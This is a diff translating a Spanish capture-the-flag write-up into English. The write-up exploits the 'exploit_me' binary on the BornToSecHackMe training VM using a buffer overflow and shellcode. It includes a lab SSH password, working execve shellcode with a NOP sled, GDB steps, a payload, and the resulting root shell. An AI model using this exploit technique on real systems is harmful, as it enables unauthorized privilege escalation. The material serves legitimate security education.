@@ -1,26 +1,26 @@
 # Writeup 5 - Buffer Overflow + Shellcode.
 
-## Índice:
+## Index:
 
-- [¿En qué consiste este método?](#en-qué-consiste-este-método)
-- [1. Acceso SSH como zaz](#1-acceso-ssh-como-zaz)
-- [2. Exportar el Shellcode](#2-exportar-el-shellcode)
-- [3. Localizar dirección shellcode](#3-localizar-dirección-shellcode)
-- [4. Construir el payload](#4-construir-el-payload)
+- [What does this method consist of?](#what-does-this-method-consist-of)
+- [1. SSH access as zaz](#1-ssh-access-as-zaz)
+- [2. Export the Shellcode](#2-export-the-shellcode)
+- [3. Locate shellcode address](#3-locate-shellcode-address)
+- [4. Build the payload](#4-build-the-payload)
 
-## ¿En qué consiste este método?
+## What does this method consist of?
 
-Este es el mismo binario `exploit_me` del **writeup1** pero con una técnica diferente. En lugar de `Ret2LibC` usamos un `shellcode`.
+This is the same `exploit_me` binary as **writeup1**, but with a different technique. Instead of `Ret2LibC`, we use `shellcode`.
 
-En el writeup1 sobrescribimos el `EIP` con la dirección de `system()` en la libc. Aquí inyectamos nuestro propio código máquina en una variable de entorno y redirigimos el `EIP` a esa dirección. El shellcode llama a `execve` via syscall para obtener una shell de root.
+In writeup1, we overwrote the `EIP` with the address of `system()` in the libc directory. Here, we inject our own machine code into an environment variable and redirect the `EIP` to that address. The shellcode calls `execve` via syscall to obtain a root shell.
 
-El **NOP sled** (`\x90` × 100) es un colchón de instrucciones vacías antes del shellcode. Si el `EIP` apunta a cualquier NOP deslizará la ejecución hasta el shellcode sin fallar.
+The **NOP sled** (`\x90` × 100) is a buffer of empty instructions before the shellcode. If the `EIP` points to any NOP, it will slide execution to the shellcode without failing.
 
-### 1. Acceso SSH como zaz
+### 1. SSH access as zaz
 
-Nos conectamos por ssh con el usuario `zaz`:
+We connect via ssh with the user `zaz`:
 
-- Usuario: zaz
+- User: zaz
 - Pasword: 646da671ca01bb5d84dbb5fb2238dc8e
 
 ```bash
@@ -37,19 +37,19 @@ zaz@192.168.0.35's password:
 zaz@BornToSecHackMe:~$ 
 ```
 
-### 2. Exportar el Shellcode
+### 2. Export the Shellcode
 
-Una vez dentro exportamos el shellcode con un NOP sled como variable de entorno:
+Once inside, we export the shellcode with a NOP sled as an environment variable:
 ```bash
 zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'")
 zaz@BornToSecHackMe:~$ 
 ```
 
-### 3. Localizar dirección shellcode
+### 3. Locate shellcode address
 
-Una vez exportado, arrancamos GDB para encontrar la dirección del shellcode en memoria sin el output completo. 
+Once exported, we start GDB to find the shellcode's memory address without the full output.
 
-Abrimos GDB y usamos este truco para encontrar directamente la dirección de la variable de entorno con `getenv`:
+We open GDB and use this trick to directly find the environment variable's address with `getenv`:
 ```bash
 zaz@BornToSecHackMe:~$ gdb ./exploit_me
 (gdb) b main
@@ -59,13 +59,13 @@ $1 = 0xbffff8aa "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22
 (gdb) 
 ```
 
-## **Dirección del shellcode: 0xbffff8aa**
+## **Shellcode address: 0xbffff8aa**
 
-### 4. Construir el payload
+### 4. Build the payload
 
-Ahora salimos de `gdb` y construimos el payload con esa dirección en little endian.
+Now we exit `gdb` and construct the payload using that address in little endian.
 
-El payload es idéntico al del `writeup1`: **140 bytes de padding** más la dirección del shellcode en little endian:
+The payload is identical to that of `writeup1`: **140 bytes of padding** plus the little endian address of the shellcode:
 ```text
 (gdb) q
 ```
@@ -73,7 +73,7 @@ El payload es idéntico al del `writeup1`: **140 bytes de padding** más la dire
 ./exploit_me $(python -c "print 'A' * 140 + '\xaa\xf8\xff\xbf'")
 ```
 
-Y ejecutamos:
+And we execute:
 ```bash
 zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\xaa\xf8\xff\xbf'")
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
@@ -83,4 +83,4 @@ root
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 # 
 ```
-## **ROOT conseguido con shellcode. euid=0 (privilegios de root).**
+## **ROOT obtained with shellcode. euid=0 (root privileges).**
